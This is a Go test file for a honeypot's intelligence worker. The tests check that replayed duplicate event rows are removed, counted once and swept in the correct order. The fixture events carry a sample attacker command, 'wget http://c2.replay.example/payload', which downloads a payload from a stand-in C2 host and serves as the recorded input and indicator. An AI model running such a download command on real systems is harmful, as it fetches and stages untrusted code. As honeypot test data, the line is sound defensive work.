package intelligence

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// replayDB is fakeDB with a store that knows which rows are second copies of
// an observation (their ID ends in "-replay") and deletes them when asked.
type replayDB struct {
	*fakeDB
	fail    error
	removed []string
}

func (d *replayDB) RemoveReplayedEvents(_ context.Context, events []*database.Event) ([]*database.Event, int, error) {
	if d.fail != nil {
		return nil, 0, d.fail
	}
	var kept []*database.Event
	n := 0
	for _, e := range events {
		if strings.HasSuffix(e.ID, "-replay") {
			d.removed = append(d.removed, e.ID)
			n++
			continue
		}
		kept = append(kept, e)
	}
	// The deleted rows are gone from the store.
	left := d.fakeDB.events[:0]
	for _, e := range d.fakeDB.events {
		if !strings.HasSuffix(e.ID, "-replay") {
			left = append(left, e)
		}
	}
	d.fakeDB.events = left
	return kept, n, nil
}

func fetchEvent(id string, at time.Time) *database.Event {
	return &database.Event{ID: id, Honeypot: "cowrie", EventType: "command",
		Command: "wget http://c2.replay.example/payload", SourceIP: "203.0.113.5", Timestamp: at}
}

// sightings returns how often the worker counted the download host.
func sightings(db *fakeDB) int64 {
	db.storeMu.Lock()
	defer db.storeMu.Unlock()
	var n int64
	for _, ioc := range db.iocRows {
		if strings.Contains(ioc.Value, "c2.replay.example") && ioc.Type == "domain" {
			n += ioc.Count
		}
	}
	return n
}

// A log line the collector read twice is two rows. The worker must count it
// once and say how many rows it removed.
func TestWorkerDoesNotCountAReplayedEvent(t *testing.T) {
	now := time.Now().UTC()
	rows := func() []*database.Event {
		return []*database.Event{fetchEvent("a", now), fetchEvent("a-replay", now.Add(time.Second)), fetchEvent("b", now.Add(2*time.Second))}
	}

	// Control: a store that cannot tell copies apart counts all three.
	plain := &fakeDB{events: rows()}
	w := newTestWorker(t, plain)
	if n := w.runOnce(context.Background()); n != 3 {
		t.Fatalf("control: runOnce handled %d events, want 3", n)
	}
	control := sightings(plain)
	if control != 3 {
		t.Fatalf("control: the download host was counted %d times, want 3 (the test would prove nothing)", control)
	}

	db := &replayDB{fakeDB: &fakeDB{events: rows()}}
	w = newTestWorker(t, db.fakeDB)
	w.db = db
	if n := w.runOnce(context.Background()); n != 2 {
		t.Fatalf("runOnce classified %d events, want the 2 that are not second copies", n)
	}
	if got := sightings(db.fakeDB); got != 2 {
		t.Errorf("the download host was counted %d times, want 2", got)
	}
	if got := w.ReplaysRemoved(); got != 1 {
		t.Errorf("ReplaysRemoved() = %d, want 1", got)
	}
	if len(db.removed) != 1 || db.removed[0] != "a-replay" {
		t.Errorf("removed rows %v, want [a-replay]", db.removed)
	}
	if err := w.LastError(); err != nil {
		t.Errorf("worker reports an error after removing a replay: %v", err)
	}
}

// A batch made only of second copies leaves nothing to classify. That is
// progress, not an idle pass and not an error.
func TestWorkerBatchOfOnlyReplays(t *testing.T) {
	now := time.Now().UTC()
	db := &replayDB{fakeDB: &fakeDB{events: []*database.Event{fetchEvent("a-replay", now), fetchEvent("b-replay", now)}}}
	w := newTestWorker(t, db.fakeDB)
	w.db = db
	n, ok := w.runBatch(context.Background())
	if n != 2 || !ok {
		t.Fatalf("runBatch = %d, %v; want 2 rows handled and success", n, ok)
	}
	if got := sightings(db.fakeDB); got != 0 {
		t.Errorf("second copies were counted %d times", got)
	}
	if db.fakeDB.taggedCount.Load() != 0 {
		t.Error("a deleted row was tagged")
	}
	if w.ReplaysRemoved() != 2 {
		t.Errorf("ReplaysRemoved() = %d, want 2", w.ReplaysRemoved())
	}
}

// When the store cannot remove second copies, nothing of the batch may be
// counted: the next pass reads the same rows and tries again.
func TestWorkerStopsWhenReplaysCannotBeRemoved(t *testing.T) {
	now := time.Now().UTC()
	db := &replayDB{fakeDB: &fakeDB{events: []*database.Event{fetchEvent("a", now), fetchEvent("a-replay", now)}}, fail: errors.New("database is away")}
	w := newTestWorker(t, db.fakeDB)
	w.db = db
	n, ok := w.runBatch(context.Background())
	if n != 0 || ok {
		t.Fatalf("runBatch = %d, %v; want 0 and failure", n, ok)
	}
	if got := sightings(db.fakeDB); got != 0 {
		t.Errorf("events were counted %d times although second copies could not be removed", got)
	}
	if w.LastError() == nil {
		t.Error("the failure is not reported")
	}
	db.fail = nil
	if n := w.runOnce(context.Background()); n != 1 {
		t.Fatalf("after the store is back, runOnce classified %d events, want 1", n)
	}
	if got := sightings(db.fakeDB); got != 1 {
		t.Errorf("the download host was counted %d times after recovery, want 1", got)
	}
}

// sweepDB is backlogDB with a store that removes second copies (IDs ending in
// "-replay") both ways: when the worker reads them in order, and by a sweep
// that takes up to window of them from anywhere, newest first. It records
// the order of sweeps and batch reads.
type sweepDB struct {
	backlogDB
	window    int
	sweepFail error
	calls     []string
	inOrder   int
	swept     int
}

func (s *sweepDB) GetUnclassifiedEvents(ctx context.Context, limit int) ([]*database.Event, error) {
	s.calls = append(s.calls, "batch")
	return s.backlogDB.GetUnclassifiedEvents(ctx, limit)
}

func (s *sweepDB) drop(e *database.Event) {
	for i, p := range s.pending {
		if p == e {
			s.pending = append(s.pending[:i], s.pending[i+1:]...)
			return
		}
	}
}

func (s *sweepDB) RemoveReplayedEvents(_ context.Context, events []*database.Event) ([]*database.Event, int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var kept []*database.Event
	n := 0
	for _, e := range events {
		if strings.HasSuffix(e.ID, "-replay") {
			s.drop(e)
			n++
			continue
		}
		kept = append(kept, e)
	}
	s.inOrder += n
	return kept, n, nil
}

func (s *sweepDB) SweepReplayedEvents(context.Context) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.calls = append(s.calls, "sweep")
	if s.sweepFail != nil {
		return 0, s.sweepFail
	}
	n := 0
	for i := len(s.pending) - 1; i >= 0 && n < s.window; i-- {
		if e := s.pending[i]; strings.HasSuffix(e.ID, "-replay") {
			s.drop(e)
			n++
		}
	}
	s.swept += n
	return n, nil
}

// copiesBehindBacklog is a backlog of new events with second copies of
// classified events behind it, as after the collector lost its place while
// the worker was behind.
func copiesBehindBacklog(fresh, copies int) []*database.Event {
	evs := backlog(fresh + copies)
	for i, e := range evs {
		e.ID = fmt.Sprintf("new-%d", i)
		if i >= fresh {
			e.ID = fmt.Sprintf("old-%d-replay", i)
		}
	}
	return evs
}

// Second copies are removed ahead of the events older than them, and the
// sweep takes turns with classification: never two sweeps without a batch
// between them.
func TestWorkerSweepsCopiesAheadOfOrder(t *testing.T) {
	db := &sweepDB{backlogDB: backlogDB{pending: copiesBehindBacklog(300, 120)}, window: 50}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	w.drain(context.Background())
	if len(db.pending) != 0 {
		t.Fatalf("%d events left after one drain", len(db.pending))
	}
	if db.swept != 120 || db.inOrder != 0 {
		t.Errorf("copies removed by the sweep %d, in order %d; want 120 by the sweep, before the worker reached them", db.swept, db.inOrder)
	}
	if w.ReplaysRemoved() != 120 {
		t.Errorf("ReplaysRemoved() = %d, want 120", w.ReplaysRemoved())
	}
	// The first batch loads the worker's checkpoint; the sweep follows it.
	if len(db.calls) < 2 || db.calls[1] != "sweep" {
		t.Errorf("calls %v, want a sweep right after the first batch", db.calls)
	}
	for i := 1; i < len(db.calls); i++ {
		if db.calls[i] == "sweep" && db.calls[i-1] == "sweep" {
			t.Fatalf("two sweeps without a batch between them: %v", db.calls)
		}
	}
	if err := w.LastError(); err != nil {
		t.Errorf("worker error after sweeping: %v", err)
	}
	// Once a sweep finds nothing, the next waits for sweepEvery.
	db.calls = nil
	db.pending = backlog(10)
	w.drain(context.Background())
	if strings.Join(db.calls, " ") != "batch" {
		t.Errorf("calls of a drain right after a sweep found nothing: %v, want one batch", db.calls)
	}
}

// A sweep that fails changes nothing else: the copies go when the worker
// reaches them, and every new event is classified.
func TestWorkerSweepFailureDoesNotStopClassification(t *testing.T) {
	db := &sweepDB{backlogDB: backlogDB{pending: copiesBehindBacklog(300, 120)}, window: 50, sweepFail: errors.New("database is away")}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	w.drain(context.Background())
	if len(db.pending) != 0 {
		t.Fatalf("%d events left after one drain", len(db.pending))
	}
	if db.inOrder != 120 || w.ReplaysRemoved() != 120 {
		t.Errorf("copies removed in order %d, counted %d; want 120", db.inOrder, w.ReplaysRemoved())
	}
	if err := w.LastError(); err != nil {
		t.Errorf("a failed sweep is reported as the worker's error: %v", err)
	}
}

// No sweep while a batch is half recorded or before the worker has loaded
// its checkpoint.
func TestWorkerDoesNotSweepDuringABatch(t *testing.T) {
	db := &sweepDB{backlogDB: backlogDB{pending: copiesBehindBacklog(0, 10)}, window: 50}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	if n := w.sweep(context.Background()); n != 0 || len(db.calls) != 0 {
		t.Fatalf("swept %d rows (calls %v) before the checkpoint was loaded", n, db.calls)
	}
	w.initialized = true
	w.pending = &database.IntelligenceCheckpoint{Revision: 1}
	if n := w.sweep(context.Background()); n != 0 || len(db.calls) != 0 {
		t.Fatalf("swept %d rows (calls %v) while a batch was half recorded", n, db.calls)
	}
	w.pending = nil
	if n := w.sweep(context.Background()); n != 10 {
		t.Fatalf("swept %d rows, want 10", n)
	}
}

// A worker that keeps up looks ahead for copies only every sweepIdleEvery
// (its next batch reads every unclassified row anyway); one that is behind
// every sweepEvery; one that is finding copies before every batch.
func TestWorkerSweepCadence(t *testing.T) {
	w := newTestWorker(t, &fakeDB{})
	w.lastSweep = time.Now().Add(-sweepEvery - time.Second)
	if w.sweepDue() {
		t.Error("a worker that keeps up swept again after sweepEvery")
	}
	w.behind = true
	if !w.sweepDue() {
		t.Error("a worker that is behind did not sweep after sweepEvery")
	}
	w.behind, w.lastSweep = false, time.Now().Add(-sweepIdleEvery-time.Second)
	if !w.sweepDue() {
		t.Error("a worker that keeps up did not sweep after sweepIdleEvery")
	}
	w.lastSweep, w.sweeping = time.Now(), true
	if !w.sweepDue() {
		t.Error("a worker finding copies did not sweep before its next batch")
	}
}

// Copies found in a batch start the look-ahead at once.
func TestWorkerCopiesInABatchStartTheSweep(t *testing.T) {
	db := &sweepDB{backlogDB: backlogDB{pending: copiesBehindBacklog(50, 0)}, window: 5}
	for i := 0; i < 10; i++ {
		e := backlog(1)[0]
		e.ID = fmt.Sprintf("early-%d-replay", i)
		db.pending = append([]*database.Event{e}, db.pending...)
	}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	w.drain(context.Background())
	if got := strings.Join(db.calls, " "); got != "batch sweep batch" {
		t.Errorf("calls %q, want a sweep right after the batch that found copies", got)
	}
}
